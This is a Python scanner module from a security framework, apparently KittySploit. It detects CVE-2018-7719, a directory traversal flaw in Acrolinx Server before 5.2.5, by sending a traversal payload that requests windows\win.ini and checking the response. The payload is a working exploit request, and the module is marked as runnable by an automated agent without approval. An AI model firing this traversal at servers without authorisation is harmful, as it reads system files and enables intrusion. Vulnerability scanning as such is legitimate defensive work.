#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Acrolinx Server prior to 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Acrolinx Server <5.2.5 - Local File Inclusion Detection',
        'description': 'Acrolinx Server prior to 5.2.5 suffers from a local file inclusion vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2018', 'cve', 'acrolinx', 'lfi', 'packetstorm', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/146911/Acrolinx-Server-Directory-Traversal.html',
            'https://support.acrolinx.com/hc/en-us/articles/213987685-Acrolinx-Server-Version-5-1-including-subsequent-service-releases-',
            'https://www.exploit-db.com/exploits/44345/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7719',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-7719',
    }

    def run(self):
        path = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Acrolinx Server <5.2.5 - Local File Inclusion detected', path=path)
            return True
        return False

